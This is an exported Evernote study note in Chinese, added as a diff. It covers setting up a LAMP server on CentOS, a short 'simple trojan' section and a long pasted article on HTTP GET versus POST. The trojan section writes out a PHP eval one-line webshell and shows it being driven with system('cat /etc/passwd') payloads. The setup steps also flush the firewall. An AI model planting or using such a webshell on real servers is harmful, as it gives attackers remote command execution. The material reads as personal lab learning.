@@ -1,0 +1,380 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.10 (454269)"/><meta name="author" content="1074768461@qq.com"/><meta name="created" content="2016-12-04 02:44:10 +0000"/><meta name="source" content="desktop.mac"/><meta name="updated" content="2016-12-04 13:42:58 +0000"/><title>LAMP</title></head><body><div><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures"/></div><div><span style="font-variant-caps: normal; font-family: Menlo; font-variant-ligatures: no-common-ligatures;"><hr/></span></div><div><span style="font-variant-caps: normal; font-family: Menlo; font-variant-ligatures: no-common-ligatures;"><font style="font-size: 18px;" color="#4017f3"><b><i>yum安装必要程序组件</i></b></font><br/><hr style="font-style: normal; font-weight: normal; font-size: 11px;"/></span></div><div><ul><li><span style="font-family: Menlo;"><font style="font-size: 14px;">备份CentOS-Base.repo  mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum./CentOS-Base.repo.backup</font></span><br/></li><li><span style="font-family: Menlo;"><font style="font-size: 14px;"><span style="font-variant-ligatures: no-common-ligatures;">cd /etc/yum.repos.d/</span></font></span><br/></li><li><span style="font-family: Menlo;"><font style="font-size: 14px;">wget <a href="http://mirrors.163.com/.help/CentOS6-Base-163.repo">http://mirrors.163.com/.help/CentOS6-Base-163.repo</a> //修改源</font></span><br/></li><li><span style="font-family: Menlo;"><font style="font-size: 14px;">yum makecache (CentOS6)//apt-get update(KALI)</font></span><br/></li><li><span style="font-family: Menlo;"><font style="font-size: 14px;">mv CentOS-Base.repo /root/  //将CentOS-Base.repo移除</font></span><br/></li><li><span style="font-family: Menlo;"><font style="font-size: 14px;"><span style="font-variant-ligatures: no-common-ligatures;">yum install httpd //安装Apache</span></font></span><br/></li><li><span style="font-family: Menlo;"><font style="font-size: 14px;">yum install mysql mysql-server //安装mysql</font></span><br/></li><li><span style="font-family: Menlo;"><font style="font-size: 14px;">yum install php php-mysql php-devel httpd-manual mod_ssl mod_perl mod_auth_mysql mysql-devel</font></span><br/></li><li><span style="font-size: 14px;"><span style="font-variant-ligatures: no-common-ligatures;"><font face="Menlo">service httpd start  （启用Apache）</font></span></span><br/></li><li><span style="font-size: 14px;"><span style="font-variant-ligatures: no-common-ligatures;"><font face="Menlo">service mysqld start (启用mysql)</font></span></span><br/></li><li><span style="font-size: 14px;"><span style="font-variant-ligatures: no-common-ligatures;"><font face="Menlo">/usr/bin/mysql_secure_installation  （mysql加固项，可不做）</font></span></span><br/></li><li><span style="font-variant-ligatures: no-common-ligatures;"><font face="Menlo"><font style="font-family: Menlo; font-size: 14px;">iptables -F  //关闭防火墙</font></font></span></li></ul></div><div><hr/><font style="font-weight: bold; font-family: Menlo; font-size: 18px; font-style: italic; color: rgb(64, 23, 243);">搭建WEB服务器</font><br/></div><div><font style="font-family: Menlo;"><hr style="font-size: 18px; font-style: italic; font-weight: bold; color: rgb(64, 23, 243);"/><font style="font-size: 14px;" color="#060206"><ul><li>安装服务器 yum install httpd<br/></li><li>启动apache service httpd start<br/></li><li>发布 cd /var/www/html<br/></li><li>     vim index.html<br/></li><li>chkconfig - - list | grep ssh //查看进程服务<br/></li><li><table style="width: 100%; border-collapse: collapse; table-layout: fixed;"><tbody><tr><td style="width: 100%; border: 1px solid rgb(219, 219, 219); padding: 10px; margin: 0px;"><div>切换级别后进入对应/etc/rcx.d/</div><div><div/><div>service xxx start // /etc/init.d/xxx start</div></div><div>netstat -ntap //查看正在被使用的端口<br/></div></td></tr></tbody></table></li></ul></font></font></div><div><div/></div><div/><div><div><div style="font-size: 16px;"><hr/><font style="font-weight: bold; font-family: Menlo; font-size: 18px; font-style: italic; color: rgb(64, 23, 243);">简易木马</font></div><div><font/><hr/><ul><li>进入发布路径下  cd /var/www/html</li><li>编写php一句话木马 vim 1.php</li><li><table style="width: 100%; border-collapse: collapse; table-layout: fixed;"><tbody><tr><td style="width: 100%; border: 1px solid rgb(219, 219, 219); padding: 10px; margin: 0px;"><div><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures; color: #d53bd3">&lt;?php</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures"><br/> @</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures; color: #ce7924">eval</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures; color: #d53bd3">(</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures; color: #ce7924">$</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures; color: #34bbc7">_POST</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures; color: #d53bd3">[</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures">'</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures; color: #c33720">pass</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures">'</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures; color: #d53bd3">])</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures">;<br/>
+</span><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures; color: #d53bd3">?&gt;</span><br/></div></td></tr></tbody></table></li></ul><div><ul><li>firefox安装插件 hackbar</li><li style=""><font style="font-size: 14px;" color="#090a17"><span style="font-family: Menlo;">URL 192.x.x.x/1.php</span><br/></font></li><li style=""><font color="#090a17"><font face="Menlo">POST请求 hackber 中 </font></font><span style="font-size: 14px; color: rgb(9, 10, 23); font-family: Menlo;">pass=phpinfo(“dir /etc//</span><span style="font-size: 14px; color: rgb(9, 10, 23); font-family: Menlo;">”);pass=system(“cat /etc/passwd</span><font face="Menlo" color="#090a17">”); 按execuse</font></li><li style=""><font face="Menlo" color="#090a17">GET请求  URL中 192.x.x.x/1.php？<span style="font-size: 14px; color: rgb(9, 10, 23); font-family: Menlo;">pass=phpinfo(“dir /etc//</span><span style="font-size: 14px; color: rgb(9, 10, 23); font-family: Menlo;">”);pass=system(“cat /etc/passwd</span><font face="Menlo" color="#090a17">”);</font></font></li><li style=""><font style="font-family: Menlo; font-size: 14px;" color="#060708">php 请求 GET() POST() // Option put copy move</font><br/></li><li style=""><font style="font-family: Menlo; font-size: 14px;" color="#060708">GET与POST区别：</font></li><li style=""><font style="font-family: Menlo; font-size: 14px;" color="#060708"><table style="width: 100%; border-collapse: collapse; table-layout: fixed;"><tbody><tr><td style="width: 100%; border: 1px solid rgb(219, 219, 219); padding: 10px; margin: 0px;"><div><font style="font-size: 12px;">get与post区别</font></div><div><div/><div><p style="color: rgb(51, 51, 51); font-family: Arial;"><span style="color:rgb(255,0,0);"><strong><font style="font-size: 12px;">一 原理区别</font></strong></span></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+    一般在浏览器中输入网址访问资源都是通过GET方式；在FORM提交中，可以通过Method指定提交方式为GET或者POST，默认为GET提交</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是<span style="color:rgb(255,0,0);"><strong>GET，POST，PUT，DELETE</strong></span></font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+URL全称是资源描述符，我们可以这样认 为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的<span style="color:rgb(255,102,0);">查</span> ，<span style="color:rgb(255,102,0);">改</span> ，<span style="color:rgb(255,102,0);">增</span> ，<span style="color:rgb(255,102,0);">删</span> 4个操作。到这里，大家应该有个大概的了解了，GET一般用于<span style="color:rgb(255,102,0);">获取/查询</span> 资源信息，而POST一般用于<span style="color:rgb(255,102,0);">更新</span> 资源信息(<span style="color:rgb(255,0,0);"><strong>个人认为这是GET和POST的本质区别，也是协议设计者的本意，其它区别都是具体表现形式的差异</strong> </span>)。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　<span style="color:rgb(0,0,255);">根据HTTP规范，GET用于信息获取，而且应该是安全的和幂等的</span> 。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　1.所谓安全的意味着该操作用于获取信息而非修改信息。换句话说，GET请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像<a style="color:#df3434;font-weight:bold;" title="MySQL知识库" href="http://lib.csdn.net/base/mysql" target="_blank">数据库</a>查询一样，不会修改，增加数据，不会影响资源的状态。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　* 注意：这里安全的含义仅仅是指是非修改信息。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　2.幂等的意味着对同一URL的多个请求应该返回同样的结果。这里我再解释一下<strong><span style="color:rgb(0,0,255);">幂等</span> </strong>这个概念：</font></p>
+<div style="color: rgb(51, 51, 51); font-family: Arial;">
+<font style="font-size: 12px;"><span style="color:rgb(0,0,0);">　　<strong><span style="color:rgb(0,0,255);">幂等</span> </strong>（idempotent、idempotence）是一个数学或计算机学概念，常见于抽象代数中。<br/>
+　　<span style="background-color:rgb(0,255,255);">幂等有以下几种定义：<br/>
+　　对于单目运算，如果一个运算对于在范围内的所有的一个数多次进行该运算所得的结果和进行一次该运算所得的结果是一样的，那么我们就称该运算是幂等的。比如绝对值运算就是一个例子，在实数集中，有<span style="color:rgb(0,0,255);">abs(a)</span> </span></span><span style="background-color:rgb(0,255,255);"><span style="color:rgb(0,0,255);">=</span><span style="color:rgb(0,0,0);"><span style="color:rgb(0,0,255);">abs(abs(a))</span> 。<br/>
+　　对于双目运算，则要求当参与运算的两个值是等值的情况下，如果满足运算结果与参与运算的两个值相等，则称该运算幂等，如求两个数的最大值的函数，有在在实数集中幂等，即<span style="color:rgb(0,0,255);">max(x,x) </span> </span><span style="color:rgb(0,0,255);">=</span> <span style="color:rgb(0,0,0);"><span style="color:rgb(0,0,255);"> x</span> 。</span></span></font></div>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<span style="background-color:rgb(0,255,255);"><font style="font-size: 12px;">看完上述解释后，应该可以理解GET幂等的含义了。</font></span></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　但在实际应用中，以上2条规定并没有这么严格。引用别人文章的例子：比如，新闻站点的头版不断更新。虽然第二次请求会返回不同的一批新闻，该操 作仍然被认为是安全的和幂等的，因为它总是返回当前的新闻。从根本上说，如果目标是当用户打开一个链接时，他可以确信从自身的角度来看没有改变资源即可。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　<span style="color:rgb(0,0,255);">根据HTTP规范，POST表示可能修改变服务器上的资源的请求</span> 。继续引用上面的例子：还是新闻以网站为例，读者对新闻发表自己的评论应该通过POST实现，因为在评论提交后站点的资源已经不同了，或者说资源被修改了。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　上面大概说了一下HTTP规范中，GET和POST的一些原理性的问题。但在实际的做的时候，很多人却没有按照HTTP规范去做，导致这个问题的原因有很多，比如说：</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　1.很多人贪方便，更新资源时用了GET，因为用POST必须要到FORM（表单），这样会麻烦一点。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　2.对资源的增，删，改，查操作，其实都可以通过GET/POST完成，不需要用到PUT和DELETE。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　3.另外一个是，早期的但是Web MVC框架设计者们并<span style="color:rgb(255,102,0);">没有有意识地将URL当作抽象的资源来看待和设计</span> 。还有一个较为严重的问题是传统的Web MVC框架基本上都只支持GET和POST两种HTTP方法，而不支持PUT和DELETE方法。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+ 　　* 简单解释一下MVC：MVC本来是存在于Desktop程序中的，M是指数据模型，V是指用户界面，C则是控制器。使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　以上3点典型地描述了老一套的风格（没有严格遵守HTTP规范），随着<a style="color:#df3434;font-weight:bold;" title="大型网站架构知识库" href="http://lib.csdn.net/base/architecture" target="_blank">架构</a>的发展，现在出现REST(Representational State Transfer)，一套支持HTTP规范的新风格，这里不多说了，可以参考《RESTful Web Services》。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<strong><span style="color:rgb(255,0,0);"><font style="font-size: 12px;">二 表现形式区别</font></span></strong></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+   搞清了两者的原理区别，我们再来看一下他们实际应用中的区别：</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+    为了理解两者在传输过程中的不同，我们先看一下HTTP协议的格式：</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+    HTTP请求：</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial; text-indent: 21pt;"><font style="font-size: 12px;">
+&lt;request line&gt;</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial; text-indent: 21pt;"><font style="font-size: 12px;">
+&lt;headers&gt;</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial; text-indent: 21pt;">
+<span style="color:red;"><font style="font-size: 12px;">&lt;blank line&gt;</font></span></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial; text-indent: 21pt;"><font style="font-size: 12px;">
+&lt;request-body&gt;]</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial; text-indent: 21pt;"><font style="font-size: 12px;">
+在HTTP请求中，第一行必须是一个请求行（request line），用来说明请求类型、要访问的资源以及使用的HTTP版本。紧接着是一个首部（header）小节，用来说明服务器要使用的附加信息。在首部之后是一个空行，再此之后可以添加任意的其他数据[称之为主体（body）]。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial; text-indent: 21pt;"><font style="font-size: 12px;">
+GET与POST方法实例：<br/>
+GET <span style="color:rgb(255,0,0);">/books/?sex=man&amp;name=Professional</span> HTTP/1.1<br/>
+Host: www.wrox.com<br/>
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)<br/>
+Gecko/20050225 Firefox/1.0.1<br/>
+Connection: Keep-Alive<br/>
+<br/>
+POST / HTTP/1.1<br/>
+Host: www.wrox.com<br/>
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)<br/>
+Gecko/20050225 Firefox/1.0.1<br/>
+Content-Type: application/x-www-form-urlencoded<br/>
+Content-Length: 40<br/>
+Connection: Keep-Alive<br/>
+     （----此处空一行----）<br/>
+<span style="color:rgb(255,0,0);">name=Professional%20Ajax&amp;publisher=Wiley</span></font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial; text-indent: 21pt;"><font style="font-size: 12px;">
+ </font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial; text-indent: 21pt;"><font style="font-size: 12px;">
+有了以上对HTTP请求的了解和示例，我们再来看两种提交方式的区别：</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+   （1）GET提交，请求的数据会附在URL之后（就是把数据放置在<span style="color: rgb(51, 51, 51); font-family: Arial; text-indent: 28px;">请求行（request line）中</span>），以?分割URL和传输数据，多个参数用&amp;连接；例如：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。<span style="color: rgb(35, 35, 35); font-family: verdana, Arial, Helvetica, sans-serif; background-color: rgb(250, 255, 255);">Url的编码格式采用的是ASCII码，而不是Unicode，这也就是说你不能在Url中包含任何非ASCII字符，所有非ASCII字符均需要编码再传输，关于Url编码可参考：<a target="_blank" href="http://kb.cnblogs.com/page/133765/">http://kb.cnblogs.com/page/133765/</a></span>。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+　　POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中红色字体标明的就是实际的传输数据</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+     因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+    (2)传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，<span style="font-family:宋体;" lang="EN-US">HTTP协议规范也没有对URL长度进行限制。</span></font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<span style="font-family:宋体;" lang="EN-US"><font style="font-size: 12px;">而在实际开发中存在的限制主要有：</font></span></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<span style="font-family:宋体;" lang="EN-US"><font style="font-size: 12px;">GET:特定浏览器和服务器对URL长度有限制，例如IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于<a style="color:#df3434;font-weight:bold;" title="操作系统知识库" href="http://lib.csdn.net/base/operatingsystem" target="_blank">操作系统</a>的支持。</font></span></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<span style="font-family:宋体;" lang="EN-US"><font style="font-size: 12px;">因此对于GET提交时，传输数据就会受到URL长度的限制。</font></span></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<span style="font-family:宋体;" lang="EN-US"><font style="font-size: 12px;">POST:由于不是通过URL传值，理论上数据不受限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。</font></span></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<span style="font-family:宋体;" lang="EN-US"><font style="font-size: 12px;"> (3)安全性：</font></span></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+.POST的安全性要比GET的安全性高。注意：这里所说的安全性和上面GET提到的“安全”不是同个概念。上面“安全”的含义仅仅是不作数据修改，而这 里安全的含义是真正的Security的含义，比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存， (2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+（4）Http get,post,soap协议都是在http上运行的<br/>
+1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的<br/>
+        查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全<br/>
+2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form-urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。<br/>
+      但是：它不支持复杂数据类型，因为post没有定义传输<a style="color:#df3434;font-weight:bold;" title="算法与数据结构知识库" href="http://lib.csdn.net/base/datastructure" target="_blank">数据结构</a>的语义和规则。<br/>
+3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式<br/>
+       Content-type设置为: text/xml   任何数据都可以xml化</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+ </font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<font style="font-size: 12px;"><span style="color:rgb(255,0,0);"><strong><span style="font-family:宋体;" lang="EN-US">三 HTTP响应</span> </strong></span><br/>
+1．HTTP响应格式：</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+&lt;status line&gt;<br/>
+&lt;headers&gt;<br/>
+&lt;blank line&gt;<br/>
+[&lt;response-body&gt;]<br/>
+<br/>
+在响应中唯一真正的区别在于第一行中用状态信息代替了请求信息。状态行（status line）通过提供一个状态码来说明所请求的资源情况。 <br/>
+      <br/>
+ HTTP响应实例：<br/>
+<br/>
+HTTP/1.1 200 OK<br/>
+Date: Sat, 31 Dec 2005 23:59:59 GMT<br/>
+Content-Type: text/html;charset=ISO-8859-1<br/>
+Content-Length: 122<br/>
+＜html＞<br/>
+＜head＞<br/>
+＜title＞Wrox Homepage＜/title＞<br/>
+＜/head＞<br/>
+＜body＞<br/>
+＜!-- body goes here --＞<br/>
+＜/body＞<br/>
+＜/html＞<br/>
+2．最常用的状态码有：<br/>
+<br/>
+◆200 (OK): 找到了该资源，并且一切正常。<br/>
+◆304 (NOT MODIFIED): 该资源在上次请求之后没有任何修改。这通常用于浏览器的缓存机制。<br/>
+◆401 (UNAUTHORIZED): 客户端无权访问该资源。这通常会使得浏览器要求用户输入用户名和密码，以登录到服务器。<br/>
+◆403 (FORBIDDEN): 客户端未能获得授权。这通常是在401之后输入了不正确的用户名或密码。<br/>
+◆404 (NOT FOUND): 在指定的位置不存在所申请的资源。</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+ </font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<span style="color:rgb(255,0,0);"><strong><font style="font-size: 12px;">四 完整示例：</font></strong></span></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;"><font style="font-size: 12px;">
+例子：</font></p>
+<p style="color: rgb(51, 51, 51); font-family: Arial;">
+<font style="font-size: 12px;"><br/>
+<span style="color:rgb(255,0,0);"><strong>HTTP GET</strong> <br/>
+</span><br/>
+发送<br/>
+<br/>
+GET /DEMOWebServices2.8/Service.asmx/CancelOrder?UserID=string&amp;PWD=string&amp;OrderConfirmation=string HTTP/1.1<br/>
+Host: api.efxnow.com<br/>
+<br/>
+回复<br/>
+<br/>
+HTTP/1.1 200 OK<br/>
+Content-Type: text/xml; charset=utf-8<br/>
+Content-Length: length<br/>
+<br/>
+&lt;?xml version="1.0" encoding="utf-8"?&gt;<br/>
+&lt;objPlaceOrderResponse xmlns="https://api.efxnow.com/webservices2.3"&gt;<br/>
+&lt;Success&gt;boolean&lt;/Success&gt;<br/>
+&lt;ErrorDescription&gt;string&lt;/ErrorDescription&gt;<br/>
+&lt;ErrorNumber&gt;int&lt;/ErrorNumber&gt;<br/>
+&lt;CustomerOrderReference&gt;long&lt;/CustomerOrderReference&gt;<br/>
+&lt;OrderConfirmation&gt;string&lt;/OrderConfirmation&gt;<br/>
+&lt;CustomerDealRef&gt;string&lt;/CustomerDealRef&gt;<br/>
+&lt;/objPlaceOrderResponse&gt;<br/>
+<br/>
+<br/>
+<br/>
+<span style="color:rgb(255,0,0);"><strong>HTTP POST</strong> </span><br/>
+<br/>
+发送<br/>
+<br/>
+POST /DEMOWebServices2.8/Service.asmx/CancelOrder HTTP/1.1<br/>
+Host: api.efxnow.com<br/>
+Content-Type: application/x-www-form-urlencoded<br/>
+Content-Length: length<br/>
+<br/>
+UserID=string&amp;PWD=string&amp;OrderConfirmation=string<br/>
+<br/>
+回复<br/>
+<br/>
+HTTP/1.1 200 OK<br/>
+Content-Type: text/xml; charset=utf-8<br/>
+Content-Length: length<br/>
+<br/>
+&lt;?xml version="1.0" encoding="utf-8"?&gt;<br/>
+&lt;objPlaceOrderResponse xmlns="https://api.efxnow.com/webservices2.3"&gt;<br/>
+&lt;Success&gt;boolean&lt;/Success&gt;<br/>
+&lt;ErrorDescription&gt;string&lt;/ErrorDescription&gt;<br/>
+&lt;ErrorNumber&gt;int&lt;/ErrorNumber&gt;<br/>
+&lt;CustomerOrderReference&gt;long&lt;/CustomerOrderReference&gt;<br/>
+&lt;OrderConfirmation&gt;string&lt;/OrderConfirmation&gt;<br/>
+&lt;CustomerDealRef&gt;string&lt;/CustomerDealRef&gt;<br/>
+&lt;/objPlaceOrderResponse&gt;<br/>
+<br/>
+<br/>
+<br/>
+<span style="color:rgb(255,0,0);"><strong>SOAP 1.2</strong> </span><br/>
+<br/>
+发送<br/>
+<br/>
+POST /DEMOWebServices2.8/Service.asmx HTTP/1.1<br/>
+Host: api.efxnow.com<br/>
+Content-Type: application/soap+xml; charset=utf-8<br/>
+Content-Length: length<br/>
+<br/>
+&lt;?xml version="1.0" encoding="utf-8"?&gt;<br/>
+&lt;soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope"&gt;<br/>
+&lt;soap12:Body&gt;<br/>
+    &lt;CancelOrder xmlns="https://api.efxnow.com/webservices2.3"&gt;<br/>
+      &lt;UserID&gt;string&lt;/UserID&gt;<br/>
+      &lt;PWD&gt;string&lt;/PWD&gt;<br/>
+      &lt;OrderConfirmation&gt;string&lt;/OrderConfirmation&gt;<br/>
+    &lt;/CancelOrder&gt;<br/>
+&lt;/soap12:Body&gt;<br/>
+&lt;/soap12:Envelope&gt;<br/>
+<br/>
+回复<br/>
+<br/>
+HTTP/1.1 200 OK<br/>
+Content-Type: application/soap+xml; charset=utf-8<br/>
+Content-Length: length<br/>
+<br/>
+&lt;?xml version="1.0" encoding="utf-8"?&gt;<br/>
+&lt;soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope"&gt;<br/>
+&lt;soap12:Body&gt;<br/>
+    &lt;CancelOrderResponse xmlns="https://api.efxnow.com/webservices2.3"&gt;<br/>
+      &lt;CancelOrderResult&gt;<br/>
+        &lt;Success&gt;boolean&lt;/Success&gt;<br/>
+        &lt;ErrorDescription&gt;string&lt;/ErrorDescription&gt;<br/>
+        &lt;ErrorNumber&gt;int&lt;/ErrorNumber&gt;<br/>
+        &lt;CustomerOrderReference&gt;long&lt;/CustomerOrderReference&gt;<br/>
+        &lt;OrderConfirmation&gt;string&lt;/OrderConfirmation&gt;<br/>
+        &lt;CustomerDealRef&gt;string&lt;/CustomerDealRef&gt;<br/>
+      &lt;/CancelOrderResult&gt;<br/>
+    &lt;/CancelOrderResponse&gt;<br/>
+&lt;/soap12:Body&gt;<br/>
+&lt;/soap12:Envelope&gt;</font></p>
+<p/>
+<div/>
+   
+</div><div><div/><div style="float:right;">
+<font style="font-size: 12px;"><a style="background-position:0 0 !important;background-image:url('http://bdimg.share.baidu.com/static/api/img/share/icons_0_16.png?v=d754dcc0.png') !important;" target="_blank" href="http://blog.csdn.net/gideal_wang/article/details/4316691#"/>
+<a style="background-position:0 -52px !important;" title="分享到QQ空间" href="http://blog.csdn.net/gideal_wang/article/details/4316691#" target="_blank"/>
+<a style="background-position:0 -104px !important;" title="分享到新浪微博" href="http://blog.csdn.net/gideal_wang/article/details/4316691#" target="_blank"/>
+<a style="background-position:0 -260px !important;" title="分享到腾讯微博" href="http://blog.csdn.net/gideal_wang/article/details/4316691#" target="_blank"/>
+<a style="background-position:0 -208px !important;" title="分享到人人网" href="http://blog.csdn.net/gideal_wang/article/details/4316691#" target="_blank"/>
+<a style="background-position:0 -1612px !important;" title="分享到微信" href="http://blog.csdn.net/gideal_wang/article/details/4316691#" target="_blank"/>
+</font></div></div></div><div>
+            <dl>
+               
+                 <dt/></dl><h1 style="padding: 0px; border: 0px none; margin: 15px 0px 0px 15px; font-family: 微软雅黑; font-weight: 400;"><font style="font-size: 12px;"><span style="margin: 0px; padding: 0px; border: 0px none; font-weight: 800;"/></font></h1><h1 style="padding: 0px; border: 0px none; margin: 15px 0px 0px 15px; font-family: 微软雅黑; font-weight: 400;"><font style="font-size: 12px;"><span style="margin: 0px; padding: 0px; border: 0px none; font-weight: 800;">两种最常用的 HTTP 方法是：GET 和 POST。</span><br/></font></h1><div><div style="border:0px none;margin:0px 0px 0px 15px;padding:20px 0px;width:710px;border-width:1px 0px;border-style:solid none;border-color:rgb(170, 170, 170) -moz-use-text-color;border-image:none;">
+<h2 style="margin: 0px; padding: 0px; border: 0px none; font-weight: bold; font-family: 微软雅黑;"><font style="font-size: 12px;">什么是 HTTP？</font></h2>
+
+<p style="padding:0px;border:0px none;margin:12px 0px 0px;"><font style="font-size: 12px;">超文本传输协议（HTTP）的设计目的是保证客户机与服务器之间的通信。</font></p>
+
+<p style="padding:0px;border:0px none;margin:12px 0px 0px;"><font style="font-size: 12px;">HTTP 的工作方式是客户机与服务器之间的请求-应答协议。</font></p>
+
+<p style="padding:0px;border:0px none;margin:12px 0px 0px;"><font style="font-size: 12px;">web 浏览器可能是客户端，而计算机上的网络应用程序也可能作为服务器端。</font></p>
+
+<p style="padding:0px;border:0px none;margin:12px 0px 0px;"><font style="font-size: 12px;">举例：客户端（浏览器）向服务器提交 HTTP 请求；服务器向客户端返回响应。响应包含关于请求的状态信息以及可能被请求的内容。</font></p>
+</div><div style="border:0px none;margin:0px 0px 0px 15px;padding:20px 0px;width:710px;border-width:1px 0px;border-style:solid none;border-color:rgb(170, 170, 170) -moz-use-text-color;border-image:none;">
+<h2 style="margin: 0px; padding: 0px; border: 0px none; font-weight: bold; font-family: 微软雅黑;"><font style="font-size: 12px;">两种 HTTP 请求方法：GET 和 POST</font></h2>
+
+<p style="padding:0px;border:0px none;margin:12px 0px 0px;"><font style="font-size: 12px;">在客户机和服务器之间进行请求-响应时，两种最常被用到的方法是：GET 和 POST。</font></p>
+
